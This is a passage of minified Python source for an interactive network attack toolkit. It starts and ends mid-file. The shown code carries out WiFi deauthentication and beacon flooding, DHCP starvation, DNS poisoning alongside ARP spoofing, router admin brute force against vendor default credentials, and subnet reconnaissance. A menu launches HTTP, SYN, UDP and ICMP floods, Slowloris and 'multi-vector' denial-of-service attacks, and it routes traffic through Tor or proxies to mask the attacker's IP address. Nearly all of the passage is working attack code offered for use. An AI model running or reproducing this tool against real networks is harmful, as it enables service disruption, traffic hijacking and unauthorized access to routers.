		print(f"\n[*] Found {len(networks)} networks:");seen=set()
		for(i,net)in enumerate(networks):
			ssid=net.get(_G,_Ah)
			if ssid in seen:continue
			seen.add(ssid);bssid=net.get(_I,_H);ch=net.get(_Q,_H);sig=net.get(_V,_H);vendor=get_oui_lookup(bssid);print(f"    {i+1:>2}. {ssid:<30} BSSID: {bssid}  Ch: {ch}  Sig: {sig}  [{vendor}]")
	if not target_bssid:
		current=get_current_wifi_info()
		if current and current.get(_I):
			print(f"\n[*] Currently connected BSSID: {current[_I]} ({current.get(_G,_H)})");use=input(f"    Use this BSSID? (y/n) [y]: ").strip().lower()
			if use!='n':target_bssid=current[_I]
	if not target_bssid:
		target_bssid=input('\n[+] Target AP BSSID (MAC): ').strip()
		if not target_bssid:print('[X] No BSSID provided. Aborting.');return
	if not client_mac:
		client_mac=input("[+] Client MAC (or 'broadcast' for all, Enter=broadcast): ").strip()
		if not client_mac:client_mac=_Y
	if IS_WINDOWS and not interface:
		try:
			from scapy.all import get_windows_if_list;ifaces=get_windows_if_list();wifi_ifaces=[i for i in ifaces if'wireless'in i.get(A,'').lower()or _q in i.get(A,'').lower()or _AF in i.get(B,'').lower()]
			if wifi_ifaces:
				print(f"\n[*] WiFi interfaces found:")
				for(i,iface)in enumerate(wifi_ifaces):print(f"    {i+1}. {iface.get(B,_H)} — {iface.get(A,_H)}")
				choice=input(f"    Select interface (1-{len(wifi_ifaces)}) [1]: ").strip()or _N
				try:
					idx=int(choice)-1
					if 0<=idx<len(wifi_ifaces):interface=wifi_ifaces[idx].get(B);interface=conf.ifaces.dev_from_name(interface)
				except(ValueError,IndexError):pass
		except Exception:pass
	if not interface and not IS_WINDOWS:
		interfaces=get_network_interfaces()
		if interfaces:
			print(f"\n[*] Available interfaces:")
			for(i,(iface,ip,mac))in enumerate(interfaces):print(f"    {i+1}. {iface} — {ip} ({mac})")
		interface=input('\n[+] Monitor mode interface (e.g., wlan0mon): ').strip()
	if not channel:
		ch=input('[+] WiFi channel (1-14, Enter=auto): ').strip()
		if ch:channel=int(ch)
	print(f"\n[*] Interface:  {interface}");print(f"[*] Target AP:   {target_bssid}");print(f"[*] Client:      {client_mac}")
	if channel:print(f"[*] Channel:     {channel}")
	if not IS_WINDOWS and channel and interface:
		try:subprocess.run([_AU,str(interface).split(_D)[0]if _D in str(interface)else str(interface),_Q,str(channel)],capture_output=_B);print(f"[OK] Set channel to {channel}")
		except Exception:pass
	print(f"[*] Sending continuous deauthentication frames...");print(f"[*] Running INFINITE — press Ctrl+C to stop\n")
	def deauth_worker():
		while not stop_event.is_set():
			try:
				pkt1=RadioTap()/Dot11(addr1=client_mac,addr2=target_bssid,addr3=target_bssid)/Dot11Deauth(reason=7);pkt2=RadioTap()/Dot11(addr1=target_bssid,addr2=client_mac,addr3=target_bssid)/Dot11Deauth(reason=7)
				if interface:sendp(pkt1,iface=interface,verbose=0);sendp(pkt2,iface=interface,verbose=0)
				else:sendp(pkt1,verbose=0);sendp(pkt2,verbose=0)
				increment_packets(2);time.sleep(.1)
			except Exception:time.sleep(.5)
	try:deauth_worker()
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] Deauth attack stopped. {format_rate()}")
def wifi_deauth_attack(target_bssid=_C,client_mac=_C,interface=_C,channel=_C,target_ssid=_C):
	if IS_WINDOWS:
		if SCAPY_AVAILABLE and(NPCAP_AVAILABLE or check_root()):
			print('[*] Scapy + Npcap detected — attempting raw 802.11 deauth...')
			try:wifi_deauth_attack_scapy(target_bssid,client_mac,interface,channel);return
			except Exception as e:print(f"[!] Scapy deauth failed: {e}");print('[*] Falling back to netsh wlan disconnect...')
		wifi_deauth_attack_windows(target_ssid)
	else:wifi_deauth_attack_scapy(target_bssid,client_mac,interface,channel)
def wifi_beacon_flood(interface=_C,count=1000):
	if IS_WINDOWS:print('[X] WiFi Beacon Flood is NOT available on Windows.');print('[*] This requires Scapy with monitor mode (Linux only).');return
	if not SCAPY_AVAILABLE:print('[X] Scapy is required for beacon flood.');return
	if not check_root():print('[X] Beacon flood requires ROOT privileges.');return
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║                WiFi BEACON FLOOD ATTACK                     ║");print(f"╚══════════════════════════════════════════════════════════════╝")
	if not interface:interface=input('[+] Monitor mode interface (e.g., wlan0mon): ').strip()
	print(f"\n[*] Interface: {interface} | Fake SSIDs: {count}");print('[*] Broadcasting fake access points...');print(_A6);fake_ssids=[]
	for _ in range(count):name_len=random.randint(3,32);name=''.join(random.choices(string.ascii_letters+string.digits+' -_',k=name_len));fake_ssids.append(name)
	def beacon_worker():
		ssid_idx=0
		while not stop_event.is_set():
			try:ssid=fake_ssids[ssid_idx%len(fake_ssids)];bssid=random_mac();beacon=RadioTap()/Dot11(type=0,subtype=8,addr1=_Y,addr2=bssid,addr3=bssid)/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID='SSID',info=ssid)/Dot11Elt(ID='Rates',info='\x82\x84\x8b\x96\x0c\x12\x18$')/Dot11Elt(ID='DSset',info=chr(random.randint(1,14)));sendp(beacon,iface=interface,verbose=0);increment_packets(1);ssid_idx+=1;time.sleep(.02)
			except Exception:pass
	try:beacon_worker()
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] Beacon flood stopped. {format_rate()}")
def dhcp_starvation_attack(interface=_C,router_ip=_C):
	if IS_WINDOWS:print('[X] DHCP Starvation is NOT available on Windows.');return
	if not SCAPY_AVAILABLE:print('[X] Scapy is required for DHCP starvation.');return
	if not check_root():print('[X] DHCP starvation requires ROOT privileges.');return
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║                DHCP STARVATION ATTACK                       ║");print(f"╚══════════════════════════════════════════════════════════════╝")
	if not interface:
		interfaces=get_network_interfaces()
		if interfaces:
			print(f"\n[*] Available interfaces:")
			for(i,(iface,ip,mac))in enumerate(interfaces):print(f"    {i+1}. {iface} — {ip}")
		interface=input('\n[+] Network interface: ').strip()
	if not router_ip:
		router_ip=get_default_gateway()
		if router_ip:print(f"[*] Detected router: {router_ip}")
		else:router_ip=input(_AM).strip()
	print(f"\n[*] Interface: {interface} | Router: {router_ip}");print('[*] Exhausting DHCP pool...');print(_A6)
	def dhcp_worker():
		while not stop_event.is_set():
			try:fake_mac=random_mac();dhcp_discover=Ether(src=fake_mac,dst=_Y)/IP(src=_AR,dst='255.255.255.255')/UDP(sport=68,dport=67)/Raw(load=b'\x01\x01\x06\x00'+random.randbytes(4)+b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+b'\x00\x00\x00\x00'+bytes.fromhex(fake_mac.replace(_D,''))+b'\x00'*202+b'c\x82Sc5\x01\x01=\x07\x01'+bytes.fromhex(fake_mac.replace(_D,''))+b'7\x03\x01\x03\x06\xff');sendp(dhcp_discover,iface=interface,verbose=0);increment_packets(1);time.sleep(.05)
			except Exception:pass
	try:dhcp_worker()
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] DHCP starvation stopped. {format_rate()}")
def dns_poisoning_attack(target_ip=_C,router_ip=_C,spoof_domain=_C,spoof_ip=_C):
	if IS_WINDOWS:print('[X] DNS Poisoning is NOT available on Windows.');return
	if not SCAPY_AVAILABLE:print('[X] Scapy is required for DNS poisoning.');return
	if not check_root():print('[X] DNS poisoning requires ROOT privileges.');return
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║                  DNS POISONING ATTACK                       ║");print(f"╚══════════════════════════════════════════════════════════════╝");print(f"\n[!] NOTE: ARP spoofing must be active first!\n")
	if not router_ip:router_ip=get_default_gateway()
	if not target_ip:target_ip=input('[+] Target IP to poison DNS for: ').strip()
	if not spoof_domain:spoof_domain=input('[+] Domain to spoof (e.g., google.com): ').strip()
	if not spoof_ip:spoof_ip=input('[+] Redirect to IP: ').strip()
	print(f"\n[*] Target: {target_ip} | Spoofing: {spoof_domain} → {spoof_ip}");print(_A6)
	def dns_sniff_and_spoof(pkt):
		try:
			if pkt.haslayer(DNS)and pkt.getlayer(DNS).qr==0:
				queried_domain=pkt[DNSQR].qname.decode()
				if spoof_domain in queried_domain:spoofed_response=IP(src=router_ip,dst=pkt[IP].src)/UDP(sport=53,dport=pkt[UDP].sport)/DNS(id=pkt[DNS].id,qr=1,aa=1,qd=pkt[DNS].qd,an=DNSRR(rrname=pkt[DNSQR].qname,ttl=300,rdata=spoof_ip));send(spoofed_response,verbose=0);increment_packets(1);print(f"    [POISONED] {queried_domain} → {spoof_ip} (to {pkt[IP].src})")
		except Exception:pass
	try:sniff(filter=f"udp port 53 and src {target_ip}",prn=dns_sniff_and_spoof,store=0,stop_filter=lambda x:stop_event.is_set())
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] DNS poisoning stopped. {format_rate()}")
def router_login_bruteforce(router_ip=_C,port=_C,username=_C,wordlist=_C,vendor=_C,bssid=_C):
	if not router_ip:
		print('\n[*] No router IP specified. You can:');print('    1. Enter router IP manually');print('    2. Scan WiFi and auto‑detect by SSID');choice=input('    Choice [2]: ').strip()or _e
		if choice==_N:router_ip=input(_AM).strip()
		else:
			networks=scan_wifi_networks()
			if networks:
				print(f"\n[*] Found {len(networks)} WiFi networks:");seen=set();unique_nets=[]
				for net in networks:
					ssid=net.get(_G,_AT)
					if ssid not in seen:seen.add(ssid);unique_nets.append(net)
				for(i,net)in enumerate(unique_nets):bssid_val=net.get(_I,_H);vendor_val=get_oui_lookup(bssid_val);print(f"    {i+1:>2}. {net[_G]:<30} [{vendor_val}] BSSID: {bssid_val}  Ch: {net.get(_Q,_H)}")
				sel=input(f"\n[+] Select SSID number (1-{len(unique_nets)}) or enter SSID: ").strip();target_ssid=''
				try:
					idx=int(sel)-1
					if 0<=idx<len(unique_nets):target_ssid=unique_nets[idx][_G];bssid=unique_nets[idx].get(_I,'');vendor=get_oui_lookup(bssid)
				except ValueError:target_ssid=sel
				if target_ssid:
					print(f"\n[*] Searching for router: '{target_ssid}'...");router_ip,detected_vendor,detected_bssid=find_router_by_ssid(target_ssid)
					if router_ip:vendor=vendor or detected_vendor;bssid=bssid or detected_bssid
					else:print('[!] Could not auto‑detect router IP.');router_ip=input('[+] Enter router IP manually: ').strip()
	if not router_ip:
		router_ip=get_default_gateway()
		if router_ip:print(f"[*] Using default gateway: {router_ip}")
		else:print('[X] No router IP found.');return
	if not port:
		for p in[80,443,8080,8443]:
			try:
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1)
				if s.connect_ex((router_ip,p))==0:s.close();port=p;break
				s.close()
			except Exception:pass
		if not port:port=int(input('[+] Router admin port [80]: ').strip()or'80')
	if not vendor and bssid:vendor=get_oui_lookup(bssid)
	if not vendor:
		try:
			import urllib.request;req=urllib.request.Request(f"http://{router_ip}:{port}/",headers={_AV:USER_AGENTS[0]});resp=urllib.request.urlopen(req,timeout=3);html=resp.read(4096).decode(errors=_AH).lower();vendor_keywords={'tp-link':_F,'tplink':_F,'netgear':_S,'d-link':_O,'dlink':_O,'linksys':_R,'asus':_L,_A8:_P,'ubiquiti':_M,_A9:_M,'aironet':_P,'huawei':_Z,'xiaomi':_a,'miwifi':_a,'tenda':_f,'belkin':_g,'zyxel':_h,'technicolor':_z,'arris':_A0,'motorola':'Motorola','mikrotik':_b,'routeros':_b,'dd-wrt':'DD-WRT','openwrt':'OpenWRT','tomato':'Tomato'}
			for(keyword,vendor_name)in vendor_keywords.items():
				if keyword in html:vendor=vendor_name;break
		except Exception:pass
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║              ROUTER LOGIN BRUTEFORCE ATTACK                 ║");print(f"╚══════════════════════════════════════════════════════════════╝");print(f"\n[*] Target:  {router_ip}:{port}");print(f"[*] Vendor:  {vendor or"Unknown (generic)"}");print(f"[*] BSSID:   {bssid or"N/A"}");credentials=[]
	if vendor and vendor in ROUTER_CREDENTIALS_BY_VENDOR:credentials=ROUTER_CREDENTIALS_BY_VENDOR[vendor][:];print(f"[*] Using {len(credentials)} vendor‑specific credential pairs for {vendor}")
	for cred in ROUTER_CREDENTIALS:
		if cred not in credentials:credentials.append(cred)
	seen_creds=set();unique_creds=[]
	for c in credentials:
		if c not in seen_creds:seen_creds.add(c);unique_creds.append(c)
	credentials=unique_creds;print(f"[*] Total credential pairs: {len(credentials)}");print(f"[*] Testing...\n");found=_E;validated=set()
	for(user,pwd)in credentials:
		if stop_event.is_set():break
		if(user,pwd)in validated:continue
		validated.add((user,pwd))
		try:
			sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.settimeout(3);sock.connect((router_ip,port));auth_str=f"{user}:{pwd}";auth_b64=binascii.b2a_base64(auth_str.encode()).decode().strip();request=f"""GET / HTTP/1.1\r
Host: {router_ip}\r
Authorization: Basic {auth_b64}\r
User-Agent: {USER_AGENTS[0]}\r
Connection: close\r
\r
""";sock.send(request.encode());response=sock.recv(4096).decode(errors=_AH);sock.close();success_indicators=['200 OK','301 Moved','302 Found','303 See Other'];fail_indicators=['401 Unauthorized','403 Forbidden','WWW-Authenticate','incorrect','invalid','wrong password','try again']
			if any(si in response for si in success_indicators):
				if not any(fi in response.lower()for fi in fail_indicators):
					admin_markers=['<title','dashboard','status',_A,'router','setup','wizard','configuration',_Ae,'system','network map']
					if any(am in response.lower()for am in admin_markers):print(f"    [SUCCESS ✓] Username: {user:<15} Password: {pwd}");found=_B;break
					elif'set-cookie'in response.lower()and'session'in response.lower():print(f"    [SUCCESS ✓] Username: {user:<15} Password: {pwd}");found=_B;break
			else:print(f"    [FAILED]  {user:<15} : {pwd}")
		except(socket.timeout,ConnectionRefusedError,ConnectionResetError)as e:print(f"    [ERROR]   {user}:{pwd} — {type(e).__name__}")
		except Exception as e:pass
	if not found:print(f"\n[!] No valid credentials found in the list.");print(f"[*] Try manual credentials or a larger wordlist.")
	else:
		print(f"\n[OK] Valid credentials found!");print(f"[*] Router: {router_ip}:{port}");print(f"[*] Username: {user}");print(f"[*] Password: {pwd}")
		if vendor:print(f"[*] Vendor: {vendor}")
		print(f"[*] Access URL: http://{router_ip}:{port}")
def ssid_bruteforce(target_ssid=_C):
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║           SSID‑BASED ROUTER LOGIN BRUTEFORCE               ║");print(f"╚══════════════════════════════════════════════════════════════╝")
	if not target_ssid:
		networks=scan_wifi_networks()
		if not networks:print('[X] No WiFi networks found.');print("[*] Make sure WiFi is enabled and you're in range.");target_ssid=input('[+] Enter SSID manually: ').strip()
		else:
			print(f"\n[*] Found {len(networks)} WiFi networks:");seen=set();unique_nets=[]
			for net in networks:
				ssid=net.get(_G,_AT)
				if ssid not in seen:seen.add(ssid);unique_nets.append(net)
			for(i,net)in enumerate(unique_nets):bssid_val=net.get(_I,_H);vendor_val=get_oui_lookup(bssid_val);ch=net.get(_Q,_H);sig=net.get(_V,_H);auth=net.get(_p,_H);print(f"    {i+1:>2}. {net[_G]:<30} [{vendor_val}]");print(f"        BSSID: {bssid_val}  Ch: {ch}  Sig: {sig}  Auth: {auth}")
			sel=input(f"\n[+] Select SSID (1-{len(unique_nets)}) or type SSID name: ").strip()
			try:
				idx=int(sel)-1
				if 0<=idx<len(unique_nets):target_ssid=unique_nets[idx][_G];print(f"[*] Selected: {target_ssid}")
			except ValueError:target_ssid=sel
	if not target_ssid:print(_Ai);return
	print(f"\n[*] Target SSID: {target_ssid}");print('[*] Step 1: Locating router IP...');router_ip,vendor,bssid=find_router_by_ssid(target_ssid)
	if not router_ip:
		print('[X] Could not find router. Enter IP manually:');router_ip=input(_AM).strip()
		if not router_ip:return
	print(f"\n[*] Step 2: Bruteforcing router login at {router_ip}...");router_login_bruteforce(router_ip,vendor=vendor,bssid=bssid)
def network_reconnaissance(target_subnet=_C):
	F='ping';E='hostname';D='vendor';C='open_ports';B='mac';A='=';print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║              NETWORK RECONNAISSANCE                         ║");print(f"╚══════════════════════════════════════════════════════════════╝")
	if not target_subnet:
		router_ip=get_default_gateway();local_ip=get_local_ip()
		if router_ip:parts=router_ip.split('.');target_subnet=f"{parts[0]}.{parts[1]}.{parts[2]}.0/24";print(f"\n[*] Auto-detected subnet: {target_subnet}")
		else:target_subnet=input('\n[+] Target subnet (e.g., 192.168.1.0/24): ').strip()
	print(f"[*] Local IP: {get_local_ip()}");print(f"[*] Router IP: {get_default_gateway()}");print(f"\n[*] Scanning network...\n")
	try:network=ipaddress.IPv4Network(target_subnet,strict=_E)
	except ValueError:print(f"[X] Invalid subnet: {target_subnet}");return
	discovered_devices=[];ping_cmd=[F,'-n',_N,'-w','1000']if IS_WINDOWS else[F,'-c',_N,'-W',_N]
	def probe_host(ip_str):
		if stop_event.is_set():return
		info={_K:ip_str,B:'',D:'',E:'',C:[]}
		if not IS_WINDOWS and SCAPY_AVAILABLE and check_root():
			try:
				ans,_=srp(Ether(dst=_Y)/ARP(pdst=ip_str),timeout=.5,verbose=0)
				for(_,rcv)in ans:info[B]=rcv[Ether].src;info[D]=get_oui_lookup(info[B])
			except Exception:pass
		try:
			result=subprocess.run(ping_cmd+[ip_str],capture_output=_B,text=_B,timeout=2)
			if result.returncode==0:
				try:info[E]=socket.gethostbyaddr(ip_str)[0]
				except Exception:pass
				for port in[80,443,22,23,8080,8443,53,21,445,3389]:
					try:
						s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(.3)
						if s.connect_ex((ip_str,port))==0:info[C].append(port)
						s.close()
					except Exception:pass
				return info
		except Exception:pass
	hosts=list(network.hosts());print(f"[*] Probing {len(hosts)} hosts...\n")
	with ThreadPoolExecutor(max_workers=50)as executor:
		futures={executor.submit(probe_host,str(ip)):str(ip)for ip in hosts}
		for future in as_completed(futures):
			result=future.result()
			if result:discovered_devices.append(result)
	print(f"\n{A*70}");print(f"  NETWORK RECONNAISSANCE RESULTS");print(f"{A*70}");print(f"  Subnet: {target_subnet} | Live hosts: {len(discovered_devices)}");print(f"{A*70}\n");router_ip=get_default_gateway();router_info=_C
	for device in sorted(discovered_devices,key=lambda x:ipaddress.IPv4Address(x[_K])):
		is_router=device[_K]==router_ip;marker=' ← ROUTER'if is_router else'';print(f"  IP: {device[_K]:<15} {marker}")
		if device[B]:print(f"     MAC:        {device[B]}")
		if device[D]:print(f"     Vendor:     {device[D]}")
		if device[E]:print(f"     Hostname:   {device[E]}")
		if device[C]:print(f"     Open Ports: {sorted(device[C])}")
		print()
		if is_router:router_info=device
	if router_info:
		print(f"{A*70}");print(f"  ROUTER ANALYSIS: {router_info[_K]}");print(f"{A*70}");print(f"  Manufacturer: {router_info[D]or _o}");print(f"  MAC Address:  {router_info[B]or _o}");print(f"  Open Ports:   {router_info[C]or"None detected"}")
		for port in[80,8080,443,8443]:
			if port in router_info[C]:
				try:
					import urllib.request;req=urllib.request.Request(f"http://{router_info[_K]}:{port}/",headers={_AV:USER_AGENTS[0]});resp=urllib.request.urlopen(req,timeout=3);html=resp.read().decode(errors=_AH)
					if _AI in html:title=html.split(_AI)[1].split('</title>')[0];print(f"  Admin Title:  {title}")
					break
				except Exception:pass
		print(f"\n  [*] Try: http://{router_info[_K]}")
	print(f"\n{A*70}");print(f"  Reconnaissance complete. {len(discovered_devices)} devices found.");print(f"{A*70}")
def ask_target_type():
	print(_J+_X*62);print('[?] Select Attack Category:');print(_X*62);print('    1. Web Server / Domain Attack');print('    2. IP Address Attack');print('    3. Router Disruption (Kill router connection)');print('    4. WiFi Attack (Deauth, Beacon Flood)');print('    5. MITM Attack (ARP Spoofing, DNS Poisoning) [Linux only]');print('    6. Network Reconnaissance');print('    7. Router Login Bruteforce (IP or SSID)');print('    8. SSID‑Based Router Bruteforce (NEW — auto‑detect!)');print('    9. IPv4 Raw Network Attack [Linux only]');print(_X*62)
	while _B:
		choice=input('    Enter 1-9: ').strip();mapping={_N:_AN,_e:_K,'3':_k,'4':_q,'5':_AO,'6':_t,'7':_u,'8':_l,'9':_c}
		if choice in mapping:return mapping[choice]
		print('    [!] Please enter 1-9.')
def ask_host(target_type):
	if target_type==_k:
		router_ip=get_default_gateway()
		if router_ip:
			print(f"\n[*] Auto-detected router: {router_ip}");use=input(f"    Use this router? (y/n) [y]: ").strip().lower()
			if use!='n':return router_ip
	prompt_map={_AN:'[+] Domain: ',_K:'[+] IP Address: ',_k:_AM,_q:'[+] Target BSSID or SSID: ',_AO:'[+] Target IP (for ARP spoofing): ',_t:'[+] Subnet (Enter=auto-detect): ',_u:'[+] Router IP (Enter=auto-detect): ',_l:'[+] SSID (Enter=scan): ',_c:'[+] Target IP: '};h=input(prompt_map.get(target_type,'[+] Host: ')).strip();return h
def ask_threads(default=MAX_WORKERS_DEFAULT):
	print(f"\n[?] Number of worker threads [{default}]:");print(f"    • 100-200: Light | 200-400: Moderate | 400-600: Heavy | 600-1000: Extreme");a=input(f"    Threads [{default}]: ").strip()
	if not a:return default
	try:return min(max(int(a),1),1000)
	except ValueError:return default
def ask_scan():return input('\n[?] Run port scan first? (y/n) [y]: ').strip().lower()!='n'
def ask_stealth_scan():
	if IS_WINDOWS:print('[!] SYN stealth scan not available on Windows — using TCP connect.');return _E
	return input('[?] Use SYN stealth scan? (y/n) [n] (requires root): ').strip().lower()=='y'
def ask_ssl():return input('\n[?] Use SSL/HTTPS? (y/n) [n]: ').strip().lower()=='y'
def ask_use_tor():print('\n[?] Route through Tor network? (y/n) [n]:');return input('    Use Tor? ').strip().lower()=='y'
def ask_proxy_config(proxy_mgr):
	print('\n[?] Configure Proxy / VPN Bots for IP masking?');print('    1. Use Tor      2. Custom SOCKS5   3. Custom HTTP');print('    4. All common    5. Load list       6. No proxies')
	while _B:
		choice=input('    Enter choice (1-6) [6]: ').strip()or'6'
		if choice==_N:proxy_mgr.add_tor()
		elif choice==_e:
			addr=input('    SOCKS5 proxy (host:port): ').strip()
			if addr:proxy_mgr.add_custom_proxy(f"socks5://{addr}")
		elif choice=='3':
			addr=input('    HTTP proxy (host:port): ').strip()
			if addr:proxy_mgr.add_custom_proxy(f"http://{addr}")
		elif choice=='4':proxy_mgr.add_tor();proxy_mgr.add_common_vpn_proxies()
		elif choice=='5':
			print('    Enter proxy addresses (one per line, blank to finish):')
			while _B:
				line=input('      > ').strip()
				if not line:break
				proxy_mgr.add_custom_proxy(line)
		elif choice=='6':break
		more=input('    Add more? (y/n) [n]: ').strip().lower()
		if more!='y':break
	if proxy_mgr.proxies:proxy_mgr.list_proxies()
	return proxy_mgr
def choose_attack_method(target_type):
	print(_J+_X*62);print('[?] Choose Attack Method:');print(_X*62)
	if target_type in(_AN,_K):print('    1. HTTP/HTTPS Flood    2. SYN Flood [Linux root]');print('    3. UDP Flood           4. ICMP Flood [Linux/macOS root]');print("    5. Tor's Hammer/Slowloris  6. Multi‑Vector Assault");print('    7. IPv4 Raw Network Attack [Linux root]');mapping={_N:_i,_e:_AA,'3':_AB,'4':_AC,'5':_j,'6':_n,'7':_c}
	elif target_type==_k:print('    1. Router Connection Kill   2. HTTP Flood on Router');print('    3. Slowloris on Router      4. Multi-Vector Router Assault');mapping={_N:_k,_e:_v,'3':_m,'4':_w}
	elif target_type==_q:print('    1. WiFi Deauth [Windows + Linux]   2. WiFi Beacon Flood [Linux]');print('    3. DHCP Starvation [Linux]');mapping={_N:_AQ,_e:_Aj,'3':_Ak}
	elif target_type==_AO:print('    1. ARP Spoofing [Linux]   2. DNS Poisoning [Linux]');mapping={_N:_Al,_e:_Am}
	elif target_type==_t:return'network_recon'
	elif target_type==_u:
		print('    1. Direct IP Bruteforce');print('    2. SSID‑Based Bruteforce (auto‑detect router)')
		while _B:
			ch=input('    Enter 1-2: ').strip()
			if ch==_N:return _u
			elif ch==_e:return _l
			print('    [!] Enter 1 or 2.')
	elif target_type==_l:return _l
	elif target_type==_c:return _c
	else:return _i
	if target_type not in(_u,):print(_X*62);print("    Type 'explain <number>' for detailed explanation")
	explain_map={f"explain {k}":v for(k,v)in mapping.items()}
	while _B:
		choice=input('    Enter choice: ').strip().lower()
		if choice in explain_map:key=explain_map[choice];print(ATTACK_EXPLANATIONS.get(key,'No detailed explanation available.'));continue
		if choice in mapping:return mapping[choice]
		print(f"    [!] Enter one of: {", ".join(sorted(mapping.keys()))} (or 'explain N')")
def ask_delay():
	a=input('\n[+] Delay between Slowloris sends (ms) [500]: ').strip()
	if not a:return 500
	try:return max(10,min(int(a),10000))
	except ValueError:return 500
def ask_payload_size(default=1024):
	a=input(f"\n[+] Payload size in bytes [{default}]: ").strip()
	if not a:return default
	try:return max(1,min(int(a),65507))
	except ValueError:return default
def main():
	B='[*] Aborted.';A='yes';global stop_event,packets_sent,bytes_sent,start_time;banner();print(f"[*] Platform: {platform.system()} {platform.release()}")
	if IS_WINDOWS:print('[*] NOTE: Raw socket attacks (SYN, ICMP, IPv4 Raw, WiFi-Scapy, MITM)');print('[*]       are limited on Windows. Use HTTP/UDP/Slowloris/WiFi-netsh instead.');print('[*]       WiFi Deauth via netsh IS available on Windows!');print('[*]       SSID-Based Router Bruteforce IS available on Windows!')
	print();target_type=ask_target_type()
	if target_type==_l:reset_state();start_time=time.time();ssid_bruteforce();return
	if target_type==_t:subnet=ask_host(target_type);reset_state();start_time=time.time();network_reconnaissance(subnet if subnet else _C);return
	if target_type==_u:router_ip=ask_host(target_type);reset_state();start_time=time.time();router_login_bruteforce(router_ip if router_ip else _C);return
	if target_type==_k:
		router_ip=ask_host(target_type);threads=ask_threads(200);print(f"\n{_X*62}");print(f"[*] Target: Router at {router_ip} | Workers: {threads}");print(f"{_X*62}");confirm=input('\n[!] CONFIRM LAUNCH? This will disrupt the network! (yes/no): ').strip().lower()
		if confirm!=A:print(B);return
		reset_state();start_time=time.time()
		try:router_connection_kill(router_ip,threads)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if target_type==_q:
		attack_method=choose_attack_method(target_type);reset_state();start_time=time.time()
		try:
			if attack_method==_AQ:wifi_deauth_attack()
			elif attack_method==_Aj:
				if IS_WINDOWS:print('[X] WiFi Beacon Flood not available on Windows.')
				else:wifi_beacon_flood()
			elif attack_method==_Ak:dhcp_starvation_attack()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if target_type==_AO:
		if IS_WINDOWS:print('[X] MITM attacks are NOT available on Windows. Requires Linux + Scapy.');return
		attack_method=choose_attack_method(target_type);reset_state();start_time=time.time()
		try:
			if attack_method==_Al:router_ip=get_default_gateway();target_ip=input(_Ag).strip();arp_spoof_attack(target_ip,router_ip)
			elif attack_method==_Am:dns_poisoning_attack()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	host_input=ask_host(target_type);resolve_as=_K if target_type in(_K,_c)else _AN;ip,display_name=resolve_target(host_input,resolve_as);open_ports=[];do_scan=ask_scan()
	if do_scan:stealth=ask_stealth_scan();open_ports=scan_ports(ip,stealth=stealth)
	attack_method=choose_attack_method(target_type);port=80;use_ssl=_E;use_tor=_E;threads=MAX_WORKERS_DEFAULT;delay_ms=500;payload_size=1024;proxy_mgr=ProxyManager()
	if attack_method in(_i,_j,_n,_v,_m,_w):proxy_mgr=ask_proxy_config(proxy_mgr)
	if attack_method==_c:
		if IS_WINDOWS:print(_Af);return
		threads=ask_threads(500);print(f"\n[*] Target: {display_name} ({ip})");confirm=input('\n[!] LAUNCH IPv4 RAW ATTACK? (yes/no): ').strip().lower()
		if confirm!=A:print(B);return
		reset_state();start_time=time.time();ipv4_raw_attack(ip,threads);return
	if open_ports:port=pick_port(open_ports)
	else:port=ask_port_manual()
	if attack_method in(_i,_n,_j,_v,_m,_w):use_ssl=ask_ssl()
	if attack_method in(_j,_m):
		threads=ask_threads(200);delay_ms=ask_delay();use_tor=ask_use_tor()
		if use_tor and not proxy_mgr.proxies:proxy_mgr.add_tor()
	elif attack_method in(_i,_v):threads=ask_threads()
	elif attack_method==_AA:
		if IS_WINDOWS:print('[X] SYN Flood not available on Windows.');return
		threads=ask_threads(300)
		if not check_root():print('[!] SYN Flood requires root!')
	elif attack_method==_AB:threads=ask_threads(300);payload_size=ask_payload_size()
	elif attack_method==_AC:
		if IS_WINDOWS:print('[X] ICMP Flood not available on Windows.');return
		threads=ask_threads(200);payload_size=ask_payload_size(64)
		if not check_root():print('[!] ICMP Flood requires root.')
	elif attack_method in(_n,_w):threads=ask_threads(400)
	if attack_method in(_v,_m,_w):
		router_ip=get_default_gateway()
		if router_ip and router_ip!=ip:
			print(f"\n[!] Note: Router detected at {router_ip}");use_router=input(f"    Target router ({router_ip}) instead? (y/n) [y]: ").strip().lower()
			if use_router!='n':ip=router_ip;display_name='Router'
	print(f"\n{_X*62}");print(f"[*] Target:      {display_name} ({ip}:{port})");print(f"[*] Method:      {attack_method}");print(f"[*] Workers:     {threads} (INFINITE packets)");print(f"[*] SSL:         {use_ssl} | Proxies: {len(proxy_mgr.proxies)}")
	if attack_method in(_j,_m):print(f"[*] Tor: {use_tor} | Delay: {delay_ms}ms")
	print(f"{_X*62}");confirm=input('\n[!] CONFIRM LAUNCH? (yes/no): ').strip().lower()
	if confirm!=A:print(B);return
	reset_state();start_time=time.time()
	try:
		if attack_method==_i:http_flood(ip,port,display_name,threads,use_ssl,proxy_mgr)
		elif attack_method==_AA:syn_flood(ip,port,threads)
		elif attack_method==_AB:udp_flood(ip,port,threads,payload_size)
		elif attack_method==_AC:icmp_flood(ip,threads,payload_size)
		elif attack_method==_j:tors_hammer(ip,port,display_name,threads,use_ssl,use_tor,delay_ms,proxy_mgr)
		elif attack_method==_n:multi_vector_assault(ip,port,display_name,threads,use_ssl,proxy_mgr)
		elif attack_method==_v:http_flood(ip,port,display_name,threads,use_ssl,proxy_mgr)
